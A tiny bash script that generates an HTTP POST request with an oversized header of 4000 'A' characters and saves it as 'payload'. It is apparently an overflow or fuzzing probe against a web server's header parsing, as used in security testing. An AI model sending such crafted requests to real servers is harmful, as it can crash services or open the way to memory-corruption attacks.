#!/bin/bash

python3 -c 'print("POST / HTTP/1.1\r\nContent-Length: " + "A"*4000 + "\r\n\r\n")' > payload
